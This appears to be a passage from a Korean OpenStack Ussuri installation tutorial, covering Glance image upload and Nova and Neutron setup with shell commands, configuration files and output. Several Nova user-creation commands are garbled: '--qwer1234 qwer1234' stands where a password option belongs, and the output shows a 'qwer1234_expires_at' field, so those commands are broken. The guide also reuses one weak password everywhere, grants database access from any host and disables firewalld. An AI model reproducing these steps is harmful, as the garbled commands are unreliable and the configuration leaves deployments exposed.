--permanent\r$ controller\u0026gt; firewall-cmd --reload\r$ controller\u0026gt;    Glance Image 생성  $ controller ~(keystone)\u0026gt; mkdir -p /var/kvm/images\r$ controller ~(keystone)\u0026gt; wget wget http://download.cirros-cloud.net/0.5.1/cirros-0.5.1-x86_64-disk.img\r# 이미지를 다운받습니다.\r$ controller ~(keystone)\u0026gt; openstack image create \u0026#34;Cirros\u0026#34; --file cirros-0.5.1-x86_64-disk.img --disk-format qcow2\r+------------------+------------------------------------------------------------ -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -+\r| Field | Value |\r+------------------+------------------------------------------------------------ -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -+\r| checksum | 1d3062cd89af34e419f7100277f38b2b |\r| container_format | bare |\r| created_at | 2020-08-06T11:08:39Z |\r| disk_format | qcow2 |\r| file | /v2/images/dc7c2474-8ec9-4f74-a1c3-7cf6a9ad3d16/file |\r| id | dc7c2474-8ec9-4f74-a1c3-7cf6a9ad3d16 |\r| min_disk | 0 |\r| min_ram | 0 |\r| name | Cirros |\r| owner | c76211c24a1f460ca67274d655d46725 |\r| properties | os_hash_algo=\u0026#39;sha512\u0026#39;, os_hash_value=\u0026#39;553d220ed58cfee7dafe0 03c446a9f197ab5edf8ffc09396c74187cf83873c877e7ae041cb80f3b91489acf687183adcd689b 53b38e3ddd22e627e7f98a09c46\u0026#39;, os_hidden=\u0026#39;False\u0026#39;, owner_specified.openstack.md5=\u0026#39; 1d3062cd89af34e419f7100277f38b2b\u0026#39;, owner_specified.openstack.object=\u0026#39;images/Cirr os\u0026#39;, owner_specified.openstack.sha256=\u0026#39;c4110030e2edf06db87f5b6e4efc27300977683d5 3f040996d15dcc0ad49bb5a\u0026#39;, self=\u0026#39;/v2/images/dc7c2474-8ec9-4f74-a1c3-7cf6a9ad3d16\u0026#39; |\r| protected | False |\r| schema | /v2/schemas/image |\r| size | 16338944 |\r| status | active |\r| tags | |\r| updated_at | 2020-08-06T11:08:39Z |\r| visibility | shared |\r+------------------+------------------------------------------------------------ -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -+\r# 이미지를 등록합니다.\r$ controller ~(keystone)\u0026gt; openstack image list\r+--------------------------------------+--------+--------+\r| ID | Name | Status |\r+--------------------------------------+--------+--------+\r| dc7c2474-8ec9-4f74-a1c3-7cf6a9ad3d16 | Cirros | active |\r+--------------------------------------+--------+--------+\r# 이미지를 확인합니다.\r  "});index.add({'id':108,'href':'/docs/cloudcomputing/openstacktraining/openstack-ussuri-05/','title':"OpenStack Ussuri : Nova",'content':"OpenStack Ussuri : Nova   ----------------------- ----------------------- | [ Controller Node ] | | [ Compute Node ] | | | | Libvirt |\r| MariaDB RabbitMQ | | Nova-compute |\r| Memcached Keystone | | Open vSwitch |\r| httpd nova | | L2 Agent |\r| Nova-API | ----------------------- -----------------------  OpenStack Ussuri : Nova   Nova는 OpenStack에서 인스턴스를 생성하는 서비스입니다. Nova에 대한 자세한 설명은 Nova를 참조해주세요.     Nova, ceilometer service 및 User 생성  $ controller ~(keystone)\u0026gt; openstack user create --domain default --project service --qwer1234 qwer1234 nova\r+---------------------+----------------------------------+\r| Field | Value |\r+---------------------+----------------------------------+\r| default_project_id | 7c10c02365be496fb47f12bfd40fe4a7 |\r| domain_id | default |\r| enabled | True |\r| id | f26027517d5e4b5b984b5db8d42398c8 |\r| name | nova |\r| options | {} |\r| qwer1234_expires_at | None |\r+---------------------+----------------------------------+\r$ controller ~(keystone)\u0026gt; openstack user create --domain default --project service --qwer1234 qwer1234 placement\r+---------------------+----------------------------------+\r| Field | Value |\r+---------------------+----------------------------------+\r| default_project_id | 7c10c02365be496fb47f12bfd40fe4a7 |\r| domain_id | default |\r| enabled | True |\r| id | 2394500b4512456f9d9d5066a5ecb1f7 |\r| name | placement |\r| options | {} |\r| qwer1234_expires_at | None |\r+---------------------+----------------------------------+\r$ controller ~(keystone)\u0026gt; openstack role add --project service --user nova admin\r$ controller ~(keystone)\u0026gt; openstack role add --project service --user placement admin\r$ controller ~(keystone)\u0026gt; openstack service create --name nova --description \u0026#34;OpenStack Compute service\u0026#34; compute\r+-------------+----------------------------------+\r| Field | Value |\r+-------------+----------------------------------+\r| description | OpenStack Compute service |\r| enabled | True |\r| id | 28d495eca718439f9dc6ce395e0720dc |\r| name | nova |\r| type | compute |\r+-------------+----------------------------------+\r$ controller ~(keystone)\u0026gt; openstack service create --name placement --description \u0026#34;OpenStack Compute Placement service\u0026#34; placement\r+-------------+-------------------------------------+\r| Field | Value |\r+-------------+-------------------------------------+\r| description | OpenStack Compute Placement service |\r| enabled | True |\r| id | 8515d3d046834de9b71b2938aae89898 |\r| name | placement |\r| type | placement |\r+-------------+-------------------------------------+\r$ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne compute public http://controller:8774/v2.1/%\\(tenant_id\\)s\r--------------+-------------------------------------------+\r| Field | Value |\r+--------------+-------------------------------------------+\r| enabled | True |\r| id | f13ca97a20eb46a3a1c1dfab546a00cc |\r| interface | public |\r| region | RegionOne |\r| region_id | RegionOne |\r| service_id | 28d495eca718439f9dc6ce395e0720dc |\r| service_name | nova |\r| service_type | compute |\r| url | http://controller:8774/v2.1/%(tenant_id)s |\r+--------------+-------------------------------------------+\r$ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne compute internal http://controller:8774/v2.1/%\\(tenant_id\\)s\r+--------------+-------------------------------------------+\r| Field | Value |\r+--------------+-------------------------------------------+\r| enabled | True |\r| id | 1bc41c829f2f47e7962cba46f0da8ddc |\r| interface | internal |\r| region | RegionOne |\r| region_id | RegionOne |\r| service_id | 28d495eca718439f9dc6ce395e0720dc |\r| service_name | nova |\r| service_type | compute |\r| url | http://controller:8774/v2.1/%(tenant_id)s |\r+--------------+-------------------------------------------+\r$ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne compute admin http://controller:8774/v2.1/%\\(tenant_id\\)s\r+--------------+-------------------------------------------+\r| Field | Value |\r+--------------+-------------------------------------------+\r| enabled | True |\r| id | 8022a415f22c400c92989320a2be3133 |\r| interface | admin |\r| region | RegionOne |\r| region_id | RegionOne |\r| service_id | 28d495eca718439f9dc6ce395e0720dc |\r| service_name | nova |\r| service_type | compute |\r| url | http://controller:8774/v2.1/%(tenant_id)s |\r+--------------+-------------------------------------------+\r$ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne placement public http://controller:8778\r+--------------+----------------------------------+\r| Field | Value |\r+--------------+----------------------------------+\r| enabled | True |\r| id | 5e988f2be72242f0b3923e27e9db009c |\r| interface | public |\r| region | RegionOne |\r| region_id | RegionOne |\r| service_id | 8515d3d046834de9b71b2938aae89898 |\r| service_name | placement |\r| service_type | placement |\r| url | http://controller:8778 |\r+--------------+----------------------------------+\r$ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne placement internal http://controller:8778\r+--------------+----------------------------------+\r| Field | Value |\r+--------------+----------------------------------+\r| enabled | True |\r| id | a68cf8b6eeb043c2aa1ec95d7711cb50 |\r| interface | internal |\r| region | RegionOne |\r| region_id | RegionOne |\r| service_id | 8515d3d046834de9b71b2938aae89898 |\r| service_name | placement |\r| service_type | placement |\r| url | http://controller:8778 |\r+--------------+----------------------------------+\r$ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne placement admin http://controller:8778\r+--------------+----------------------------------+\r| Field | Value |\r+--------------+----------------------------------+\r| enabled | True |\r| id | 63e47fcbfd7841dd95bb4d9d9a910ab5 |\r| interface | admin |\r| region | RegionOne |\r| region_id | RegionOne |\r| service_id | 8515d3d046834de9b71b2938aae89898 |\r| service_name | placement |\r| service_type | placement |\r| url | http://controller:8778 |\r+--------------+----------------------------------+\r   Nova 유저의 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p\r$ MariaDB\u0026gt; create database nova; $ MariaDB\u0026gt; grant all privileges on nova.* to nova@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on nova.* to nova@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; create database nova_api; $ MariaDB\u0026gt; grant all privileges on nova_api.* to nova@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on nova_api.* to nova@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; create database nova_cell0; $ MariaDB\u0026gt; grant all privileges on nova_cell0.* to nova@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on nova_cell0.* to nova@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;;\r$ MariaDB\u0026gt; create database placement; $ MariaDB\u0026gt; grant all privileges on placement.* to placement@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on placement.* to placement@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;\r   Nova 설치  $ controller\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-nova openstack-placement-api\r# nova 및 관련 모듈을 설치합니다.\r$ controller\u0026gt; vi /etc/nova/nova.conf\r[DEFAULT]\rmy_ip = controller\rstate_path = /var/lib/nova\renabled_apis = osapi_compute,metadata\rlog_dir = /var/log/nova\rtransport_url = rabbit://openstack:qwer1234@controller\r[api]\rauth_strategy = keystone\r[glance]\rapi_servers = http://controller:9292\r[oslo_concurrency]\rlock_path = $state_path/tmp\r[api_database]\rconnection = mysql+pymysql://nova:qwer1234@controller/nova_api\r[database]\rconnection = mysql+pymysql://nova:qwer1234@controller/nova\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = nova\rpassword = qwer1234\r[placement]\rauth_url = http://controller:5000\ros_region_name = RegionOne\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = placement\rpassword = qwer1234\r[wsgi]\rapi_paste_config = /etc/nova/api-paste.ini\r$ controller\u0026gt; vi /etc/placement/placement.conf\r[DEFAULT]\rdebug = false\r[api]\rauth_strategy = keystone\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = nova\rpassword = qwer1234\r[placement_database]\rconnection = mysql+pymysql://nova:qwer1234@controller/placement\r$ controller\u0026gt; vi /etc/httpd/conf.d/00-placement-api.conf\r\u0026lt;Directory /usr/bin\u0026gt;\rRequire all granted\r\u0026lt;/Directory\u0026gt;\r# 15번 줄에 추가시킵니다.\r$ controller\u0026gt; su -s /bin/bash placement -c \u0026#34;placement-manage db sync\u0026#34;\r$ controller\u0026gt; su -s /bin/bash nova -c \u0026#34;nova-manage api_db sync\u0026#34;\r$ controller\u0026gt; su -s /bin/bash nova -c \u0026#34;nova-manage cell_v2 map_cell0\u0026#34;\r$ controller\u0026gt; su -s /bin/bash nova -c \u0026#34;nova-manage db sync\u0026#34;\r$ controller\u0026gt; su -s /bin/bash nova -c \u0026#34;nova-manage cell_v2 create_cell --name cell1\u0026#34;\r# nova DB에 임포트 시킵니다.\r$ controller\u0026gt; semanage port -a -t http_port_t -p tcp 8778\r$ controller\u0026gt; firewall-cmd --add-port={6080/tcp,6081/tcp,6082/tcp,8774/tcp,8775/tcp,8778/tcp} --permanent\r$ controller\u0026gt; firewall-cmd --reload\r$ controller\u0026gt; systemctl restart httpd\r$ controller\u0026gt; chown placement. /var/log/placement/placement-api.log\r$ controller\u0026gt; for service in api conductor scheduler novncproxy; do\rsystemctl enable --now openstack-nova-$service\r# Selinux 및 방화벽을 설정합니다.\r$ controller ~(keystone)\u0026gt; openstack compute service list\r+----+----------------+------------+----------+---------+-------+----------------------------+\r| ID | Binary | Host | Zone | Status | State | Updated At |\r+----+----------------+------------+----------+---------+-------+----------------------------+\r| 4 | nova-conductor | controller | internal | enabled | up | 2020-08-06T12:10:34.000000 |\r| 5 | nova-scheduler | controller | internal | enabled | up | 2020-08-06T12:10:38.000000 |\r+----+----------------+------------+----------+---------+-------+----------------------------+\r   Conpute node Nova 설치  nova 설차    $ compute\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-nova-compute\r# nova 및 관련 모듈을 설치합니다.\r$ dnf install -y qemu-kvm libvirt virt-install bridge-utils\r$ controller\u0026gt; scp /etc/nova/nova.conf compute:/etc/nova/nova.conf\r# nova의 기본설정파일을 복사합니다.\r$ compute\u0026gt; vi /etc/nova/nova.conf\r[default]\rmy_ip = compute\r[vnc]\renabled = True\rserver_listen = 0.0.0.0\rserver_proxyclient_address = controller\rnovncproxy_base_url = http://controller:6080/vnc_auto.html # nova관련 설정을 추가합니다.\r$ compute\u0026gt; firewall-cmd --add-port=5900-5999/tcp --permanent\r$ compute\u0026gt; firewall-cmd --reload\r$ compute\u0026gt; systemctl enable --now libvirtd\r$ compute\u0026gt; systemctl enable --now openstack-nova-compute\r   Nova 설치 확인  $ controller\u0026gt; su -s /bin/bash nova -c \u0026#34;nova-manage cell_v2 discover_hosts\u0026#34;\r# DB에 compute의 대한 설정을 업데이트 합니다.\r$ controller\u0026gt; nova-manage cell_v2 discover_hosts --verbose\r# compute 노드가 검색이 안되었을 시 추가적으로 검색합니다.\r$ controller ~(keystone)\u0026gt; openstack compute service list\r+----+----------------+------------+----------+---------+-------+----------------------------+\r| ID | Binary | Host | Zone | Status | State | Updated At |\r+----+----------------+------------+----------+---------+-------+----------------------------+\r| 4 | nova-conductor | controller | internal | enabled | up | 2020-08-06T21:40:34.000000 |\r| 5 | nova-scheduler | controller | internal | enabled | up | 2020-08-06T21:40:37.000000 |\r| 8 | nova-compute | compute | nova | enabled | up | 2020-08-06T21:40:36.000000 |\r+----+----------------+------------+----------+---------+-------+----------------------------+\r  #\n"});index.add({'id':109,'href':'/docs/cloudcomputing/openstack/service/','title':"Service",'content':"****   옵셔널 서비스  컴퓨트, 오브젝트 스토리지, 이미지, 인증, 네트워크, 블록 스토리지, 대시보드 서비스만으로도 오픈스택을 구축할 수 있음 텔레미터, 오케스트레이션, 데이터베이스 같은 서비스를 제대로 사용한다면 효율적인 클라우드 관리와 운영에 많은 도움을 많을 수 있음 메시징 서비스 Zaqar 공유 파일 시스템 서비스 Manila DNS 서비스 Designate  "});index.add({'id':110,'href':'/docs/cloudcomputing/openstacktraining/openstack-ussuri-06/','title':"OpenStack Ussuri : Neutron",'content':"OpenStack Ussuri : Neutron   ----------------------- ----------------------- -----------------------\r| [ Controller Node ] | | [ Compute Node ] | | [ Network Node ] | | | | Libvirt | | Open vSwitch |\r| MariaDB RabbitMQ | | Nova compute | | L2 Agent |\r| Memcached Keystone | | Open vSwitch | | L3 Agent |\r| httpd Neutron | | L2 Agent | | metadata agent |\r| Nova-API Compute | ----------------------- -----------------------\r| L2 agent L3 agent |\r| metadata agent |\r| Neutron Server | -----------------------  OpenStack Ussuri : Neutron   Neutron는 OpenStack에서 네트워크 전반을 관리하는 서비스입니다. Neutron에 대한 자세한 설명은 Neutron를 참조해주세요.     Neutron service 및 User 생성  $ controller ~(keystone)\u0026gt; openstack user create --domain default --project service --password qwer1234 neutron\r+---------------------+----------------------------------+\r| Field | Value |\r+---------------------+----------------------------------+\r| default_project_id | 7c10c02365be496fb47f12bfd40fe4a7 |\r| domain_id | default |\r| enabled | True |\r| id | 943fbb4370164c77ae6bf7fa455292f8 |\r| name | neutron |\r| options | {} |\r| password_expires_at | None |\r+---------------------+----------------------------------+\r$ controller ~(keystone)\u0026gt; openstack role add --project service --user neutron admin\r$ controller ~(keystone)\u0026gt; openstack service create --name neutron --description \u0026#34;OpenStack Networking service\u0026#34; network\r+-------------+----------------------------------+\r| Field | Value |\r+-------------+----------------------------------+\r| description | OpenStack Networking service |\r| enabled | True |\r| id | 055e5f6e38004338b0ae4a86e77932ae |\r| name | neutron |\r| type | network |\r+-------------+----------------------------------+\r# neutron service 및 user을 생성합니다.\r$ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne network public http://controller:9696\r+--------------+----------------------------------+\r| Field | Value |\r+--------------+----------------------------------+\r| enabled | True |\r| id | 350c666f597a41e59234b09f534aa72f |\r| interface | public |\r| region | RegionOne |\r| region_id | RegionOne |\r| service_id | 055e5f6e38004338b0ae4a86e77932ae |\r| service_name | neutron |\r| service_type | network |\r| url | http://controller:9696 |\r+--------------+----------------------------------+\r$ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne network internal http://controller:9696\r+--------------+----------------------------------+\r| Field | Value |\r+--------------+----------------------------------+\r| enabled | True |\r| id | b9cad959e1634ff797e27f00d50e9578 |\r| interface | internal |\r| region | RegionOne |\r| region_id | RegionOne |\r| service_id | 055e5f6e38004338b0ae4a86e77932ae |\r| service_name | neutron |\r| service_type | network |\r| url | http://controller:9696 |\r+--------------+----------------------------------+\r$ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne network admin http://controller:9696\r+--------------+----------------------------------+\r| Field | Value |\r+--------------+----------------------------------+\r| enabled | True |\r| id | 72fc145deb1d4d508e3691b3bf77708e |\r| interface | admin |\r| region | RegionOne |\r| region_id | RegionOne |\r| service_id | 055e5f6e38004338b0ae4a86e77932ae |\r| service_name | neutron |\r| service_type | network |\r| url | http://controller:9696 |\r+--------------+----------------------------------+\r# neutron endpoint를 등록합니다.\r   neutron 유저의 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p\r$ MariaDB\u0026gt; create database neutron_ml2; $ MariaDB\u0026gt; grant all privileges on neutron_ml2.* to neutron@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on neutron_ml2.* to neutron@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;\r   Neutron 설치  $ controller\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-neutron openstack-neutron-ml2\r# neutron 및 관련 모듈을 설치합니다.\r$ controller\u0026gt; vi /etc/neutron/neutron.conf\r[DEFAULT]\rcore_plugin = ml2\rservice_plugins = router\rauth_strategy = keystone\rstate_path = /var/lib/neutron\rdhcp_agent_notification = True\rallow_overlapping_ips = True\rnotify_nova_on_port_status_changes = True\rnotify_nova_on_port_data_changes = True\rtransport_url = rabbit://openstack:qwer1234@controller\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = neutron\rpassword = qwer1234\r[database]\rconnection = mysql+pymysql://neutron:qwer1234@controller/neutron_ml2\r[nova]\rauth_url = http://controller:5000\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rregion_name = RegionOne\rproject_name = service\rusername = nova\rpassword = qwer1234\r[oslo_concurrency]\rlock_path = $state_path/tmp\r$ controller\u0026gt; vi /etc/neutron/metadata_agent.ini\r[DEFAULT]\rnova_metadata_host = controller\rmetadata_proxy_shared_secret = metadata_secret\r[cache]\rmemcache_servers = controller:11211\r$ controller\u0026gt; vi /etc/neutron/plugins/ml2/ml2_conf.ini\r[ml2]\rtype_drivers = flat,vlan,gre,vxlan\rtenant_network_types = vxlan\rmechanism_drivers = openvswitch\rextension_drivers = port_security\r[ml2_type_flat]\rflat_networks = physnet1\r[ml2_type_vxlan]\rvni_ranges = 1:1000\r$ controller\u0026gt; vi /etc/nova/nova.conf\r[default]\r...\r...\ruse_neutron = True\rlinuxnet_interface_driver = nova.network.linux_net.LinuxOVSInterfaceDriver\rfirewall_driver = nova.virt.firewall.NoopFirewallDriver\r[neutron]\rauth_url = http://controller:5000\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rregion_name = RegionOne\rproject_name = service\rusername = neutron\rpassword = qwer1234\rservice_metadata_proxy = True\rmetadata_proxy_shared_secret = metadata_secret\r$ controller\u0026gt; setsebool -P neutron_can_network on\r$ controller\u0026gt; setsebool -P daemons_enable_cluster_mode on\r$ controller\u0026gt; firewall-cmd --add-port=9696/tcp --permanent\r$ controller\u0026gt; firewall-cmd --reload\r# 방화벽 및 SELinux를 설정합니다.\r$ controller\u0026gt; ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini\r$ controller\u0026gt; su -s /bin/bash neutron -c \u0026#34;neutron-db-manage --config-file /etc/neutron/neutron.conf --config-file /etc/neutron/plugin.ini upgrade head\u0026#34;\r$ controller\u0026gt; systemctl enable --now neutron-server neutron-metadata-agent\r$ controller\u0026gt; systemctl restart openstack-nova-api\r# neutron DB를 임포트 시킨 후, 서비스를 등록 합니다.\r   neutron Network Node 설치  Neutron 설치  $ network\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-neutron openstack-neutron-ml2 openstack-neutron-openvswitch libibverbs\r# neutron 및 관련 모듈을 설치합니다.\r$ network\u0026gt; vi /etc/neutron/neutron.conf\r[DEFAULT]\rcore_plugin = ml2\rservice_plugins = router\rauth_strategy = keystone\rstate_path = /var/lib/neutron\rallow_overlapping_ips = True\r# RabbitMQ connection info\rtransport_url = rabbit://openstack:qwer1234@controller\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = neutron\rpassword = qwer1234\r[oslo_concurrency]\rlock_path = $state_path/lock\r$ network\u0026gt; vi /etc/neutron/dhcp_agent.ini\r[DEFAULT]\rinterface_driver = openvswitch\rdhcp_driver = neutron.agent.linux.dhcp.Dnsmasq\renable_isolated_metadata = true\r$ network\u0026gt; vi /etc/neutron/metadata_agent.ini\rnova_metadata_host = controller\rmetadata_proxy_shared_secret = metadata_secret\r[cache]\rmemcache_servers = controller:11211\r$ network\u0026gt; vi /etc/neutron/plugins/ml2/ml2_conf.ini\r[ml2]\rtype_drivers = flat,vlan,gre,vxlan\rtenant_network_types = vxlan\rmechanism_drivers = openvswitch\rextension_drivers = port_security\r[ml2_type_flat]\rflat_networks = physnet1\r[ml2_type_vxlan]\rvni_ranges = 1:1000\r# 끝에 추가합니다.\r$ network\u0026gt; vi /etc/neutron/plugins/ml2/openvswitch_agent.ini\r[securitygroup]\rfirewall_driver = openvswitch\renable_security_group = true\renable_ipset = true\r[agent]\rtunnel_types = vxlan\rprevent_arp_spoofing = True\r[ovs]\rlocal_ip = 10.10.10.20\rbridge_mappings = physnet1:br-eth1\r# 끝에 추가합니다.\r# 여기는 IP 를 반드시 적어야 해요 !\r$ network\u0026gt; setsebool -P neutron_can_network on\r$ network\u0026gt; setsebool -P haproxy_connect_any on\r$ network\u0026gt; setsebool -P daemons_enable_cluster_mode on\r$ network\u0026gt; vi ovsofctl.te\rmodule ovsofctl 1.0;\rrequire {\rtype neutron_t;\rtype neutron_exec_t;\rtype neutron_t;\rtype dnsmasq_t;\rclass file execute_no_trans;\rclass capability { dac_override sys_rawio };\r}\r#============= neutron_t ==============\rallow neutron_t self:capability { dac_override sys_rawio };\rallow neutron_t neutron_exec_t:file execute_no_trans;\r#============= dnsmasq_t ==============\rallow dnsmasq_t self:capability dac_override;\r$ network\u0026gt; checkmodule -m -M -o ovsofctl.mod ovsofctl.te\r$ network\u0026gt; semodule_package --outfile ovsofctl.pp --module ovsofctl.mod\r$ network\u0026gt; semodule -i ovsofctl.pp\r$ systemctl disable --now firewalld\r# Selinux 및 방화벽을 설정합니다.\r$ network\u0026gt; ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini\r$ network\u0026gt; systemctl enable --now openvswitch\r$ network\u0026gt; ovs-vsctl add-br br-int\r$ network\u0026gt; ovs-vsctl add-br br-eth1\r$ network\u0026gt; ovs-vsctl add-port br-eth1 ens32\r$ network\u0026gt; vi /etc/sysconfig/network-scripts/ifcfg-ens32\rTYPE=Ethernet\rBOOTPROTO=static\rNAME=ens32\rDEVICE=ens32\rONBOOT=yes\r$ network\u0026gt; vi /var/tmp/network_interface.sh\r#!/bin/bash\rip link set up br-eth1\rip addr add 192.168.10.20/24 dev br-eth1\rroute add default gw 192.168.10.2 dev br-eth1\recho \u0026#34;nameserver 8.8.8.8\u0026#34; \u0026gt; /etc/resolv.conf\r$ network\u0026gt; chmod 755 /var/tmp/network_interface.sh\r$ network\u0026gt; vi /etc/systemd/system/set_interface.service\r[Unit]\rDescription=Description for sample script goes here\rAfter=network.target\r[Service]\rType=simple\rExecStart=/var/tmp/network_interface.sh\rTimeoutStartSec=0\r[Install]\rWantedBy=default.target\r$ systemctl enable set_interface\r$ init 6\r# network 인터페이스 주의 !!! ( ex : ens32 )\r$ network\u0026gt; for service in dhcp-agent l3-agent metadata-agent openvswitch-agent; do\rsystemctl enable --now neutron-$service\rdone\r# neutron 서비스를 등록합니다.\r  neutron compute Node 설치 Neutron 설치  $ controller\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-neutron openstack-neutron-ml2 openstack-neutron-openvswitch\r# neutron 및 관련 모듈을 설치합니다.\r$ compute\u0026gt; vi /etc/neutron/neutron.conf\r[DEFAULT]\rcore_plugin = ml2\rservice_plugins = router\rauth_strategy = keystone\rstate_path = /var/lib/neutron\rallow_overlapping_ips = True\r# RabbitMQ connection info\rtransport_url = rabbit://openstack:qwer1234@controller\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = neutron\rpassword = qwer1234\r[oslo_concurrency]\rlock_path = $state_path/lock\r$ compute\u0026gt; vi /etc/neutron/plugins/ml2/ml2_conf.ini\r[ml2]\rtype_drivers = flat,vlan,gre,vxlan\rtenant_network_types = vxlan\rmechanism_drivers = openvswitch\rextension_drivers = port_security\r[ml2_type_flat]\rflat_networks = physnet1\r[ml2_type_vxlan]\rvni_ranges = 1:1000\r# 끝에 추가합니다.\r$ compute\u0026gt; vi /etc/neutron/plugins/ml2/openvswitch_agent.ini\r[securitygroup]\rfirewall_driver = openvswitch\renable_security_group = true\renable_ipset = true\r[agent]\rtunnel_types = vxlan\rprevent_arp_spoofing = True\r[ovs]\rlocal_ip = 10.10.10.20\r# 끝에 추가합니다.\r# 여기는 반드시 IP로 적어야 해요 !\r$ compute\u0026gt; vi /etc/nova/nova.conf\r[default]\r...\r...\ruse_neutron = True\rlinuxnet_interface_driver = nova.network.linux_net.LinuxOVSInterfaceDriver\rfirewall_driver = nova.virt.firewall.NoopFirewallDriver\rvif_plugging_is_fatal = True\rvif_plugging_timeout = 300\r[neutron]\rauth_url = http://controller:5000\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rregion_name = RegionOne\rproject_name = service\rusername = neutron\rpassword = qwer1234\rservice_metadata_proxy = True\rmetadata_proxy_shared_secret = metadata_secret\r$ compute\u0026gt; setsebool -P neutron_can_network on\r$ compute\u0026gt; setsebool -P daemons_enable_cluster_mode on\r$ compute\u0026gt; vi ovsofctl.te\rmodule ovsofctl 1.0;\rrequire {\rtype neutron_t;\rtype neutron_exec_t;\rtype neutron_t;\rtype dnsmasq_t;\rclass file execute_no_trans;\rclass capability { dac_override sys_rawio };\r}\r#============= neutron_t ==============\rallow neutron_t self:capability { dac_override sys_rawio };\rallow neutron_t neutron_exec_t:file execute_no_trans;\r#============= dnsmasq_t ==============\rallow dnsmasq_t self:capability dac_override;\r$ network\u0026gt; checkmodule -m -M -o ovsofctl.mod ovsofctl.te\r$ network\u0026gt; semodule_package --outfile ovsofctl.pp --module ovsofctl.mod\r$ network\u0026gt; semodule -i ovsofctl.pp\r$ systemctl disable --now firewalld\r# Selinux 및 방화벽을 설정합니다.\r$ compute\u0026gt; ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini\r$ compute\u0026gt; systemctl enable --now openvswitch\r$ compute\u0026gt; ovs-vsctl add-br br-int\r$ compute\u0026gt; systemctl restart openstack-nova-compute\r$ compute\u0026gt; systemctl enable --now neutron-openvswitch-agent\r# neutron 서비스를 등록합니다.\r   확인  $ controller ~(keystone)\u0026gt; openstack router create router\r+-------------------------+----------------------------------------------------- -------------------------------------------------------------------------------- --------------------+\r| Field | Value |\r+-------------------------+----------------------------------------------------- -------------------------------------------------------------------------------- --------------------+\r| admin_state_up | UP |\r| availability_zone_hints | |\r| availability_zones | |\r| created_at | 2020-08-07T00:05:40Z |\r| description | |\r| distributed | False |\r| external_gateway_info | null |\r| flavor_id | None |\r| ha | False |\r| id | f40d6130-a01c-486a-b088-3f27c9f57607 |\r| location | cloud='', project.domain_id=, project.domain_name='d efault', project.id='c76211c24a1f460ca67274d655d46725', project.name='admin', re gion_name='', zone= |\r| name | router |\r| project_id | c76211c24a1f460ca67274d655d46725 |\r| revision_number | 1 |\r| routes | |\r| status | ACTIVE |\r| tags | |\r| updated_at | 2020-08-07T00:05:40Z |\r+-------------------------+----------------------------------------------------- -------------------------------------------------------------------------------- --------------------+\r$ 